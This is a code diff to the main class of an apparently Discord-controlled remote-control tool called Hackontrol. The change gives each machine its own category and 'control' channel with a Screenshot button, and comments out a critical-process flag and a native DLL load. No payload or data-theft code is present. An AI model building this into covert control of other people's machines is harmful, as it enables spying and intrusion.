@@ -1,38 +1,32 @@
 package com.khopan.hackontrol;
 
-import java.lang.annotation.Native;
-import java.util.Iterator;
-import java.util.LinkedHashMap;
-import java.util.Map;
-import java.util.Map.Entry;
-
-import com.khopan.hackontrol.command.CommandManager;
-import com.khopan.hackontrol.permission.Permission;
-import com.khopan.hackontrol.permission.PermissionManager;
+import java.util.List;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Guild;
-import net.dv8tion.jda.api.entities.User;
-import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
+import net.dv8tion.jda.api.entities.Message;
+import net.dv8tion.jda.api.entities.MessageHistory;
+import net.dv8tion.jda.api.entities.channel.concrete.Category;
+import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
+import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
-import net.dv8tion.jda.api.interactions.commands.Command;
-import net.dv8tion.jda.api.interactions.commands.build.SlashCommandData;
+import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
 	private static Hackontrol INSTANCE;
 
-	@Native
-	private static final boolean CRITICAL_PROCESS = false;
+	/*@Native Useful for later
+	private static final boolean CRITICAL_PROCESS = false;*/
 
 	private final JDA bot;
 	private final Guild guild;
-	private final Map<Command, com.khopan.hackontrol.command.Command> map;
+	//private final Map<Command, com.khopan.hackontrol.command.Command> map;
 
 	private Hackontrol() {
 		Hackontrol.INSTANCE = this;
-		this.map = new LinkedHashMap<>();
+		//this.map = new LinkedHashMap<>();
 		this.bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
 				.addEventListeners(new Listener())
@@ -46,11 +40,31 @@ public class Hackontrol {
 			return;
 		}
 
-		this.guild = this.bot.getGuildById(1181833410235351171L);
-		CommandManager.register(this :: register);
+		this.guild = this.bot.getGuildById(1173967259304198154L);
+		/*List<RichCustomEmoji> list = this.guild.getEmojis();
+		//CommandManager.register(this :: register);
+
+		for(int i = 0; i < list.size(); i++) {
+			RichCustomEmoji emoji = list.get(i);
+			System.out.println(emoji.getName());
+		}*/
+
+		String identifier = Machine.getIdentifier();
+		Category category = DiscordUtils.getOrCreateCategory(this.guild, identifier);
+		TextChannel controlChannel = DiscordUtils.getOrCreateTextChannelInCategory(category, "control");
+		MessageHistory history = MessageHistory.getHistoryFromBeginning(controlChannel).complete();
+		List<Message> messageList = history.getRetrievedHistory();
+
+		if(messageList.isEmpty()) {
+			controlChannel.sendMessage("**Screen Control**").addActionRow(Button.success("screenshot", "Screenshot")).complete();
+		}
+
+		/*Category category = this.guild.createCategory(identifier).complete();
+		TextChannel channel = this.guild.createTextChannel("main", category).complete();
+		channel.sendMessage("Hello, world!").complete();*/
 	}
 
-	private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
+	/*private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
 		if(commandClass == null) {
 			return;
 		}
@@ -100,7 +114,7 @@ public class Hackontrol {
 			.queue();
 			return;
 		}
-	}
+	}*/
 
 	public JDA getBot() {
 		return this.bot;
@@ -148,7 +162,7 @@ public class Hackontrol {
 		}
 
 		System.load(libraryFile.getAbsolutePath());*/
-		System.load("D:\\GitHub Repository\\Hackontrol\\Native Library\\x64\\Release\\Native Library.dll");
+		//System.load("D:\\GitHub Repository\\Hackontrol\\Native Library\\x64\\Release\\Native Library.dll");
 		Hackontrol.getInstance();
 	}
 
@@ -162,8 +176,8 @@ public class Hackontrol {
 
 	private class Listener extends ListenerAdapter {
 		@Override
-		public void onSlashCommandInteraction(SlashCommandInteractionEvent Event) {
-			Hackontrol.this.onSlashCommand(Event);
+		public void onButtonInteraction(ButtonInteractionEvent Event) {
+			Event.deferReply().queue(hook -> hook.deleteOriginal().queue());
 		}
 	}
 }
